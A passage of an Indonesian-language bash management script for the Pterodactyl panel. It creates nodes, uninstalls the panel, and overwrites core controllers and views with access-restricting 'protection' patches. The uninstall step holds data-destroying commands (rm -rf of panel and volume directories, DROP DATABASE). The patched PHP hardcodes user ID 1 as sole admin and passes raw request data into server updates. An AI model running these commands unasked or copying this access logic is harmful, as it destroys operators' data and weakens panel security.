        sudo -u www-data php artisan optimize:clear > /dev/null 2>&1
        sudo -u www-data php artisan view:clear > /dev/null 2>&1
        sudo -u www-data php artisan config:clear > /dev/null 2>&1
        sudo -u www-data php artisan route:clear > /dev/null 2>&1
        sudo -u www-data php artisan cache:clear > /dev/null 2>&1
        sudo rm -f /usr/local/bin/blueprint

        log_info "   - Restart layanan..."
        sudo systemctl restart nginx > /dev/null 2>&1 || sudo systemctl restart apache2 > /dev/null 2>&1
        sudo systemctl restart "php*-fpm" > /dev/null 2>&1 || true
        sudo systemctl restart pteroq > /dev/null 2>&1
        sudo -u www-data php artisan up

        print_success "Panel berhasil direset ke versi original!"
        break
        ;;
      [Nn]*)
        echo -e "\n${BOLD}❌ Operasi dibatalkan.${NC}"
        return
        ;;
      *)
        echo -e "\n${BOLD}Pilihan tidak valid! Silahkan pilih (y) atau (n).${NC}"
        ;;
    esac
  done
  
  echo ""
  log_success "╔════════════════════════════════════════════════════╗"
  log_success "║         PANEL BERHASIL DI-RESET!                  ║"
  log_success "╚════════════════════════════════════════════════════╝"
  echo ""
  sleep 2
}

# ============================================================
# FUNGSI CREATE NODE UNTUK PTERODACTYL
# ============================================================

create_node() {
  clear
  echo -e "${BRIGHT_CYAN}${BOLD}"
  echo "   ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗"
  echo "  ██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝"
  echo "  ██║     ██████╔╝█████╗  ███████║   ██║   █████╗  "
  echo "  ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  "
  echo "  ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗"
  echo "   ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
  echo -e "${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}           CREATE NODE & LOCATION${NC}"
  echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}"
  echo ""

  # Cek direktori panel
  if [ ! -d "/var/www/pterodactyl" ]; then
    print_error "Direktori Pterodactyl tidak ditemukan!"
    echo -e "${YELLOW}Pastikan panel sudah terinstall di /var/www/pterodactyl${NC}"
    echo ""
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  fi

  cd /var/www/pterodactyl || { 
    print_error "Gagal masuk ke direktori Pterodactyl"
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  }

  print_info "CREATE LOCATION & NODE"

  # Input data location
  echo -e "${BRIGHT_YELLOW}─── LOCATION INFORMATION ───${NC}"
  echo -n -e "${BOLD}Masukkan nama location (contoh: SGP): ${NC}"
  read location_name
  [ -z "$location_name" ] && location_name="SGP" && echo -e "${YELLOW}Menggunakan default: SGP${NC}"

  echo -n -e "${BOLD}Masukkan id location (angka, contoh: 1): ${NC}"
  read locid
  [ -z "$locid" ] && locid="1" && echo -e "${YELLOW}Menggunakan default: 1${NC}"

  echo ""
  echo -e "${BRIGHT_YELLOW}─── NODE INFORMATION ───${NC}"
  echo -n -e "${BOLD}Masukkan nama node (contoh: Nodes): ${NC}"
  read node_name
  [ -z "$node_name" ] && node_name="Nodes" && echo -e "${YELLOW}Menggunakan default: Nodes${NC}"

  echo -n -e "${BOLD}Masukkan deskripsi (contoh: Panel by Zyura): ${NC}"
  read description
  [ -z "$description" ] && description="Panel by Zyura" && echo -e "${YELLOW}Menggunakan default: Panel by Zyura${NC}"

  echo -n -e "${BOLD}Masukkan domain node (contoh: node.example.com): ${NC}"
  read domain
  [ -z "$domain" ] && domain="node.example.com" && echo -e "${YELLOW}⚠️  Domain tidak diisi, menggunakan default. Edit nanti di panel!${NC}"

  echo -n -e "${BOLD}Masukkan RAM (dalam MB, contoh: 1000): ${NC}"
  read ram
  [ -z "$ram" ] && ram="1000" && echo -e "${YELLOW}Menggunakan default: 1000 MB${NC}"

  echo -n -e "${BOLD}Masukkan jumlah maksimum disk space (dalam MB, contoh: 50000): ${NC}"
  read disk_space
  [ -z "$disk_space" ] && disk_space="50000" && echo -e "${YELLOW}Menggunakan default: 50000 MB${NC}"

  echo ""
  echo -e "${BRIGHT_RED}${BOLD}Konfirmasi data:${NC}"
  echo -e "  ${CYAN}Location:${NC} $location_name (ID: $locid)"
  echo -e "  ${CYAN}Node:${NC} $node_name"
  echo -e "  ${CYAN}Domain:${NC} $domain"
  echo -e "  ${CYAN}RAM:${NC} $ram MB"
  echo -e "  ${CYAN}Disk:${NC} $disk_space MB"
  echo ""
  echo -n -e "${BOLD}Lanjutkan membuat Location & Node? (y/n): ${NC}"
  read confirmation

  if [[ "$confirmation" != [yY] ]]; then
    echo -e "${BOLD}Pembuatan dibatalkan.${NC}"
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return
  fi

  echo ""
  log_info "[1/4] Membuat Location..."

  # Membuat location
  php artisan p:location:make --short="$location_name" --long="$description" <<< "yes" > /dev/null 2>&1

  if [ $? -eq 0 ]; then
    log_success "✓ Location '$location_name' berhasil dibuat"
  else
    log_error "✗ Gagal membuat location"
  fi

  log_info "[2/4] Membuat Node..."

  # Membuat node
  php artisan p:node:make \
    --name="$node_name" \
    --description="$description" \
    --locationId="$locid" \
    --fqdn="$domain" \
    --public=1 \
    --scheme="https" \
    --proxy=0 \
    --maintenance=0 \
    --maxMemory="$ram" \
    --overallocateMemory=0 \
    --maxDisk="$disk_space" \
    --overallocateDisk=0 \
    --uploadSize=100 \
    --daemonListeningPort=8443 \
    --daemonSFTPPort=2022 \
    --daemonBase="/var/lib/pterodactyl/volumes" <<< "yes" > /dev/null 2>&1

  if [ $? -eq 0 ]; then
    log_success "✓ Node '$node_name' berhasil dibuat"
  else
    log_error "✗ Gagal membuat node"
  fi

  log_info "[3/4] Mengambil konfigurasi otomatis untuk Wings..."

  # Dapatkan Node ID terbaru
  NODE_ID=$(php artisan tinker --execute="echo optional(\Pterodactyl\Models\Node::latest()->first())->id;" 2>/dev/null | grep -E '^[0-9]+$' | tail -n 1)

  if [ -z "$NODE_ID" ]; then
    echo -e "${YELLOW}⚠️  Gagal mendapatkan Node ID dari database.${NC}"
    echo -e "${YELLOW}⚠️  Silakan konfigurasi Wings secara manual.${NC}"
  else
    log_success "✓ Node ID terdeteksi: $NODE_ID"
    
    log_info "[4/4] Membuat file konfigurasi Wings..."
    mkdir -p /etc/pterodactyl
    php artisan p:node:configuration "$NODE_ID" > /etc/pterodactyl/config.yml 2>/dev/null

    if [ -f "/etc/pterodactyl/config.yml" ]; then
      log_success "✓ File konfigurasi berhasil dibuat di /etc/pterodactyl/config.yml"
    else
      log_error "✗ Gagal membuat file konfigurasi"
    fi
  fi

  echo ""
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}           ✅ NODE BERHASIL DIBUAT!${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo ""
  echo -e "${YELLOW}${BOLD}📌 LANGKAH SELANJUTNYA:${NC}"
  echo -e "  ${WHITE}1.${NC} Kembali ke menu utama"
  echo -e "  ${WHITE}2.${NC} Pilih menu ${BRIGHT_CYAN}[4] Wings Installation${NC}"
  echo -e "  ${WHITE}3.${NC} Install Wings untuk mengaktifkan node"
  echo -e "  ${WHITE}4.${NC} Setelah Wings terinstall, node akan online"
  echo ""
  echo -e "${RED}${BOLD}⚠️  Catatan:${NC} Jika Wings belum diinstall, node akan offline"
  echo -e "${RED}         Install Wings melalui menu utama untuk mengaktifkan node${NC}"
  echo ""
  echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"

  echo ""
  echo -n -e "${BOLD}Tekan Enter untuk kembali ke menu utama...${NC}"
  read
}
# ============================================================
# FUNGSI UNINSTALL PANEL
# ============================================================

uninstall_panel_full() {
  echo ""
  log_info "╔════════════════════════════════════════════════════╗"
  log_info "║         UNINSTALL PANEL PTERODACTYL               ║"
  log_info "╚════════════════════════════════════════════════════╝"
  echo ""
  
  echo -n -e "${BOLD}${BRIGHT_RED}PERINGATAN: Semua data panel akan dihapus! Lanjutkan? (y/n): ${NC}"
  read confirmation
  if [[ "$confirmation" != [yY] ]]; then 
    echo -e "${BOLD}Uninstall dibatalkan.${NC}"
    return
  fi

  print_info "Memulai proses uninstall..."

  if [ -f "/var/www/pterodactyl/.env" ]; then
      log_info "Menghapus database panel..."
      DB_NAME=$(grep "^DB_DATABASE=" /var/www/pterodactyl/.env | cut -d'=' -f2)
      DB_USER=$(grep "^DB_USERNAME=" /var/www/pterodactyl/.env | cut -d'=' -f2)
      mysql -u root -e "DROP DATABASE IF EXISTS $DB_NAME; DROP USER IF EXISTS '$DB_USER'@'127.0.0.1';" > /dev/null 2>&1 || true
  fi

  log_info "Menghentikan layanan..."
  systemctl disable --now wings pteroq > /dev/null 2>&1 || true
  systemctl disable --now redis-server > /dev/null 2>&1 || true
  systemctl stop nginx apache2 > /dev/null 2>&1 || true

  log_info "Membersihkan Cronjob..."
  (crontab -l 2>/dev/null | grep -v "pterodactyl" | crontab -) || true

  log_info "Menghapus file sistem..."
  rm -rf /var/www/pterodactyl
  rm -rf /etc/pterodactyl
  rm -rf /var/lib/pterodactyl
  rm -f /usr/local/bin/wings
  rm -f /usr/local/bin/blueprint

  log_info "Menghapus konfigurasi service..."
  rm -f /etc/systemd/system/wings.service
  rm -f /etc/systemd/system/pteroq.service
  systemctl daemon-reload

  log_info "Menghapus konfigurasi webserver..."
  rm -f /etc/nginx/sites-enabled/pterodactyl.conf
  rm -f /etc/nginx/sites-available/pterodactyl.conf
  rm -f /etc/apache2/sites-enabled/pterodactyl.conf
  rm -f /etc/apache2/sites-available/pterodactyl.conf

  systemctl restart nginx > /dev/null 2>&1 || systemctl restart apache2 > /dev/null 2>&1 || true
  
  print_success "Uninstall panel selesai!"
  
  echo ""
  log_success "╔════════════════════════════════════════════════════╗"
  log_success "║         UNINSTALL PANEL SUKSES!                   ║"
  log_success "╚════════════════════════════════════════════════════╝"
  echo ""
  sleep 2
}
# ============================================================
# FUNGSI INSTALL PROTECT PANEL (via SSH)
# ============================================================

install_panel_protect() {
  clear
  echo -e "${BRIGHT_CYAN}${BOLD}"
  echo "   ██████╗██████╗  ██████╗ ████████╗███████╗ ██████╗████████╗"
  echo "  ██╔═══╝██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝"
  echo "  ██║    ██████╔╝██║   ██║   ██║   █████╗  ██║        ██║   "
  echo "  ██║    ██╔═══╝ ██║   ██║   ██║   ██╔══╝  ██║        ██║   "
  echo "  ╚██████╗██║     ╚██████╔╝   ██║   ███████╗╚██████╗   ██║   "
  echo "   ╚═════╝╚═╝      ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   "
  echo -e "${NC}"
  echo -e "${BRIGHT_RED}${BOLD}           INSTALL PANEL PROTECTION${NC}"
  echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}"
  echo ""

  # Cek direktori panel
  if [ ! -d "/var/www/pterodactyl" ]; then
    print_error "Direktori Pterodactyl tidak ditemukan!"
    echo -e "${YELLOW}Pastikan panel sudah terinstall di /var/www/pterodactyl${NC}"
    echo ""
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  fi

  echo -e "${YELLOW}${BOLD}⚠️  PERINGATAN:${NC}"
  echo -e "  ${WHITE}• Fitur ini akan menginstall 14 proteksi sekaligus${NC}"
  echo -e "  ${WHITE}• Proteksi meliputi: Anti Intip Server, Anti Cadmin, Anti Delete Server${NC}"
  echo -e "  ${WHITE}• Hanya Admin ID 1 yang bisa akses semua menu setelah proteksi${NC}"
  echo -e "  ${WHITE}• User biasa hanya bisa akses servernya sendiri${NC}"
  echo ""
  echo -e "${BRIGHT_RED}${BOLD}Proteksi yang akan diinstall:${NC}"
  echo -e "  ${CYAN}1.${NC} Anti Intip Server In Settings"
  echo -e "  ${CYAN}2.${NC} Otomatis Isi Server Owner"
  echo -e "  ${CYAN}3.${NC} Anti Update Detail Server"
  echo -e "  ${CYAN}4.${NC} Anti Update Build Configuration"
  echo -e "  ${CYAN}5.${NC} Anti Setup Server"
  echo -e "  ${CYAN}6.${NC} Anti Update Database"
  echo -e "  ${CYAN}7.${NC} Anti Button Transfer Server"
  echo -e "  ${CYAN}8.${NC} Anti Button Suspend Status"
  echo -e "  ${CYAN}9.${NC} Anti Button Reinstall Status"
  echo -e "  ${CYAN}10.${NC} Anti Delete Server"
  echo -e "  ${CYAN}11.${NC} Anti Intip Users & Anti Cadmin"
  echo -e "  ${CYAN}12.${NC} Anti Intip Location, Nodes, Nest, Settings"
  echo -e "  ${CYAN}13.${NC} Anti Akses File & Download"
  echo -e "  ${CYAN}14.${NC} Menyembunyikan Menu Admin untuk User Biasa"
  echo ""
  echo -n -e "${BOLD}Lanjutkan instalasi proteksi? (y/n): ${NC}"
  read confirmation

  if [[ "$confirmation" != [yY] ]]; then
    echo -e "${BOLD}Instalasi dibatalkan.${NC}"
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return
  fi

  print_info "Memulai instalasi proteksi panel..."

  # Backup file asli (sederhana)
  BACKUP_DIR="/root/panel-backup-$(date +%Y%m%d-%H%M%S)"
  mkdir -p "$BACKUP_DIR"
  log_info "[1/4] Membackup file asli ke $BACKUP_DIR..."

  # Backup file-file penting yang akan diganti
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ServerController.php belum ada"
  cp /var/www/pterodactyl/resources/views/admin/servers/new.blade.php "$BACKUP_DIR/" 2>/dev/null || echo "File new.blade.php belum ada"
  cp /var/www/pterodactyl/app/Services/Servers/DetailsModificationService.php "$BACKUP_DIR/" 2>/dev/null || echo "File DetailsModificationService.php belum ada"
  cp /var/www/pterodactyl/app/Services/Servers/BuildModificationService.php "$BACKUP_DIR/" 2>/dev/null || echo "File BuildModificationService.php belum ada"
  cp /var/www/pterodactyl/app/Services/Servers/StartupModificationService.php "$BACKUP_DIR/" 2>/dev/null || echo "File StartupModificationService.php belum ada"
  cp /var/www/pterodactyl/app/Services/Databases/DatabaseManagementService.php "$BACKUP_DIR/" 2>/dev/null || echo "File DatabaseManagementService.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerTransferController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ServerTransferController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ServersController.php belum ada"
  cp /var/www/pterodactyl/app/Services/Servers/ReinstallServerService.php "$BACKUP_DIR/" 2>/dev/null || echo "File ReinstallServerService.php belum ada"
  cp /var/www/pterodactyl/app/Services/Servers/ServerDeletionService.php "$BACKUP_DIR/" 2>/dev/null || echo "File ServerDeletionService.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php "$BACKUP_DIR/" 2>/dev/null || echo "File UserController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/LocationController.php "$BACKUP_DIR/" 2>/dev/null || echo "File LocationController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/NodeController.php "$BACKUP_DIR/" 2>/dev/null || echo "File NodeController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/Nests/NestController.php "$BACKUP_DIR/" 2>/dev/null || echo "File NestController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/Settings/IndexController.php "$BACKUP_DIR/" 2>/dev/null || echo "File IndexController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/FileController.php "$BACKUP_DIR/" 2>/dev/null || echo "File FileController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ServerController.php (API) belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/ApiController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ApiController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Api/Client/ApiKeyController.php "$BACKUP_DIR/" 2>/dev/null || echo "File ApiKeyController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/DatabaseController.php "$BACKUP_DIR/" 2>/dev/null || echo "File DatabaseController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/MountController.php "$BACKUP_DIR/" 2>/dev/null || echo "File MountController.php belum ada"
  cp /var/www/pterodactyl/app/Http/Controllers/Api/Client/TwoFactorController.php "$BACKUP_DIR/" 2>/dev/null || echo "File TwoFactorController.php belum ada"
  cp /var/www/pterodactyl/resources/views/layouts/admin.blade.php "$BACKUP_DIR/" 2>/dev/null || echo "File admin.blade.php belum ada"

  log_success "✓ Backup selesai"

  log_info "[2/4] Membuat struktur direktori (jika belum ada)..."
  mkdir -p /var/www/pterodactyl/app/Http/Controllers/Admin/Servers
  mkdir -p /var/www/pterodactyl/resources/views/admin/servers
  mkdir -p /var/www/pterodactyl/app/Services/Servers
  mkdir -p /var/www/pterodactyl/app/Services/Databases
  mkdir -p /var/www/pterodactyl/app/Http/Controllers/Admin/Nodes
  mkdir -p /var/www/pterodactyl/app/Http/Controllers/Admin/Nests
  mkdir -p /var/www/pterodactyl/app/Http/Controllers/Admin/Settings
  mkdir -p /var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers
  mkdir -p /var/www/pterodactyl/resources/views/layouts

  log_info "[3/4] Menginstall file proteksi..."

  # ==================== PROTECT1 ====================
  log_info "   - Installing PROTECT1 (Anti Intip Server In Settings)..."
  cat > /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php <<'EOF'
<?php

namespace Pterodactyl\Http\Controllers\Admin\Servers;

use Illuminate\View\View;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Pterodactyl\Models\Server;
use Pterodactyl\Models\User;
use Pterodactyl\Models\Nest;
use Pterodactyl\Models\Location;
use Spatie\QueryBuilder\QueryBuilder;
use Spatie\QueryBuilder\AllowedFilter;
use Pterodactyl\Http\Controllers\Controller;
use Pterodactyl\Models\Filters\AdminServerFilter;
use Illuminate\Contracts\View\Factory as ViewFactory;

class ServerController extends Controller
{
    public function __construct(private ViewFactory $view)
    {
    }

    public function index(Request $request): View
    {
        $user = Auth::user();

        $query = Server::query()
            ->with(['node', 'user', 'allocation'])
            ->orderBy('id', 'asc');

        if ($user->id !== 1) {
            $query->where('owner_id', $user->id);
        }

        $servers = QueryBuilder::for($query)
            ->allowedFilters([
                AllowedFilter::exact('owner_id'),
                AllowedFilter::custom('*', new AdminServerFilter()),
            ])
            ->when($request->has('filter') && isset($request->filter['search']), function ($q) use ($request) {
                $search = $request->filter['search'];
                $q->where(function ($sub) use ($search) {
                    $sub->where('name', 'like', "%{$search}%")
                        ->orWhere('uuidShort', 'like', "%{$search}%")
                        ->orWhere('uuid', 'like', "%{$search}%");
                });
            })
            ->paginate(config('pterodactyl.paginate.admin.servers'))
            ->appends($request->query());

        return $this->view->make('admin.servers.index', ['servers' => $servers]);
    }

    public function create(): View
    {
        $user = Auth::user();

        if ($user->id === 1) {
            $users = User::all();
            $lock_owner = false;
            $auto_owner = null;
        } else {
            $users = collect([$user]);
            $lock_owner = true;
            $auto_owner = $user;
        }

        return $this->view->make('admin.servers.new', [
            'users' => $users,
            'lock_owner' => $lock_owner,
            'auto_owner' => $auto_owner,
            'locations' => Location::with('nodes')->get(),
            'nests' => Nest::with('eggs')->get(),
        ]);
    }

    public function view(Server $server): View
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat atau mengedit server ini! ©Protect By @wilzzofficial.');
        }

        return $this->view->make('admin.servers.view', ['server' => $server]);
    }

    public function update(Request $request, Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah server ini! ©Protect By @wilzzofficial.');
        }

        $data = $request->except(['owner_id']);
        $server->update($data);

        return redirect()->route('admin.servers.view', $server->id)
            ->with('success', '✅ Server berhasil diperbarui.');
    }

    public function destroy(Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat menghapus server ini! ©Protect By @wilzzofficial.');
        }

        $server->delete();
        return redirect()->route('admin.servers')
            ->with('success', '🗑️ Server berhasil dihapus.');
    }
}
EOF

  # ==================== PROTECT2 (new.blade.php) ====================
  log_info "   - Installing PROTECT2 (Otomatis Isi Server Owner)..."
  cat > /var/www/pterodactyl/resources/views/admin/servers/new.blade.php <<'EOF'
@extends('layouts.admin')

@section('title')
    New Server
@endsection

@section('content-header')
    <h1>Create Server<small>Add a new server to the panel.</small></h1>
    <ol class="breadcrumb">
        <li><a href="{{ route('admin.index') }}">Admin</a></li>
        <li><a href="{{ route('admin.servers') }}">Servers</a></li>
        <li class="active">Create Server</li>
    </ol>
@endsection

@section('content')
<form action="{{ route('admin.servers.new') }}" method="POST">
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Core Details</h3>
                </div>

                <div class="box-body row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pName">Server Name</label>
                            <input type="text" class="form-control" id="pName" name="name" value="{{ old('name') }}" placeholder="Server Name">
                            <p class="small text-muted no-margin">Character limits: <code>a-z A-Z 0-9 _ - .</code> and <code>[Space]</code>.</p>
                        </div>

<div class="form-group">
    <label for="pUserId">Server Owner</label>

    @if(Auth::user()->id == 1)
        <select id="pUserId" name="owner_id" class="form-control">
            <option value="">Select a User</option>
            @foreach(\Pterodactyl\Models\User::all() as $user)
                <option value="{{ $user->id }}" @selected(old('owner_id') == $user->id)>
                    {{ $user->username }} ({{ $user->email }})
                </option>
            @endforeach
        </select>
        <p class="small text-muted no-margin">As admin, you can manually choose the server owner.</p>
    @else
        <input type="hidden" id="pUserId" name="owner_id" value="{{ Auth::user()->id }}">
        <input type="text" class="form-control" value="{{ Auth::user()->email }}" disabled>
        <p class="small text-muted no-margin">This server will be owned by your account automatically.</p>
    @endif
</div>
                    </div>

                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pDescription" class="control-label">Server Description</label>
                            <textarea id="pDescription" name="description" rows="3" class="form-control">{{ old('description') }}</textarea>
                            <p class="text-muted small">A brief description of this server.</p>
                        </div>

                        <div class="form-group">
                            <div class="checkbox checkbox-primary no-margin-bottom">
                                <input id="pStartOnCreation" name="start_on_completion" type="checkbox" {{ \Pterodactyl\Helpers\Utilities::checked('start_on_completion', 1) }} />
                                <label for="pStartOnCreation" class="strong">Start Server when Installed</label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Allocation Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-sm-4">
                        <label for="pNodeId">Node</label>
                        <select name="node_id" id="pNodeId" class="form-control">
                            @foreach($locations as $location)
                                <optgroup label="{{ $location->long }} ({{ $location->short }})">
                                @foreach($location->nodes as $node)

                                <option value="{{ $node->id }}"
                                    @if($location->id === old('location_id')) selected @endif
                                >{{ $node->name }}</option>

                                @endforeach
                                </optgroup>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">The node which this server will be deployed to.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocation">Default Allocation</label>
                        <select id="pAllocation" name="allocation_id" class="form-control"></select>
                        <p class="small text-muted no-margin">The main allocation that will be assigned to this server.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocationAdditional">Additional Allocation(s)</label>
                        <select id="pAllocationAdditional" name="allocation_additional[]" class="form-control" multiple></select>
                        <p class="small text-muted no-margin">Additional allocations to assign to this server on creation.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Application Feature Limits</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDatabaseLimit" class="control-label">Database Limit</label>
                        <div>
                            <input type="text" id="pDatabaseLimit" name="database_limit" class="form-control" value="{{ old('database_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of databases a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pAllocationLimit" class="control-label">Allocation Limit</label>
                        <div>
                            <input type="text" id="pAllocationLimit" name="allocation_limit" class="form-control" value="{{ old('allocation_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of allocations a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pBackupLimit" class="control-label">Backup Limit</label>
                        <div>
                            <input type="text" id="pBackupLimit" name="backup_limit" class="form-control" value="{{ old('backup_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of backups that can be created for this server.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Resource Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pCPU">CPU Limit</label>

                        <div class="input-group">
                            <input type="text" id="pCPU" name="cpu" class="form-control" value="{{ old('cpu', 0) }}" />
                            <span class="input-group-addon">%</span>
                        </div>

                        <p class="text-muted small">If you do not want to limit CPU usage, set the value to <code>0</code>. To determine a value, take the number of threads and multiply it by 100. For example, on a quad core system without hyperthreading <code>(4 * 100 = 400)</code> there is <code>400%</code> available. To limit a server to using half of a single thread, you would set the value to <code>50</code>. To allow a server to use up to two threads, set the value to <code>200</code>.<p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pThreads">CPU Pinning</label>

                        <div>
                            <input type="text" id="pThreads" name="threads" class="form-control" value="{{ old('threads') }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced:</strong> Enter the specific CPU threads that this process can run on, or leave blank to allow all threads. This can be a single number, or a comma separated list. Example: <code>0</code>, <code>0-1,3</code>, or <code>0,1,3,4</code>.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pMemory">Memory</label>

                        <div class="input-group">
                            <input type="text" id="pMemory" name="memory" class="form-control" value="{{ old('memory') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">The maximum amount of memory allowed for this container. Setting this to <code>0</code> will allow unlimited memory in a container.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pSwap">Swap</label>

                        <div class="input-group">
                            <input type="text" id="pSwap" name="swap" class="form-control" value="{{ old('swap', 0) }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">Setting this to <code>0</code> will disable swap space on this server. Setting to <code>-1</code> will allow unlimited swap.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDisk">Disk Space</label>

                        <div class="input-group">
                            <input type="text" id="pDisk" name="disk" class="form-control" value="{{ old('disk') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">This server will not be allowed to boot if it is using more than this amount of space. If a server goes over this limit while running it will be safely stopped and locked until enough space is available. Set to <code>0</code> to allow unlimited disk usage.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pIO">Block IO Weight</label>

                        <div>
                            <input type="text" id="pIO" name="io" class="form-control" value="{{ old('io', 500) }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced</strong>: The IO performance of this server relative to other <em>running</em> containers on the system. Value should be between <code>10</code> and <code>1000</code>. Please see <a href="https://docs.docker.com/engine/reference/run/#block-io-bandwidth-blkio-constraint" target="_blank">this documentation</a> for more information about it.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
                            <input type="checkbox" id="pOomDisabled" name="oom_disabled" value="0" {{ \Pterodactyl\Helpers\Utilities::checked('oom_disabled', 0) }} />
                            <label for="pOomDisabled" class="strong">Enable OOM Killer</label>
                        </div>

                        <p class="small text-muted no-margin">Terminates the server if it breaches the memory limits. Enabling OOM killer may cause server processes to exit unexpectedly.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Nest Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pNestId">Nest</label>

                        <select id="pNestId" name="nest_id" class="form-control">
                            @foreach($nests as $nest)
                                <option value="{{ $nest->id }}"
                                    @if($nest->id === old('nest_id'))
                                        selected="selected"
                                    @endif
                                >{{ $nest->name }}</option>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">Select the Nest that this server will be grouped under.</p>
                    </div>

                    <div class="form-group col-xs-12">
                        <label for="pEggId">Egg</label>
                        <select id="pEggId" name="egg_id" class="form-control"></select>
                        <p class="small text-muted no-margin">Select the Egg that will define how this server should operate.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
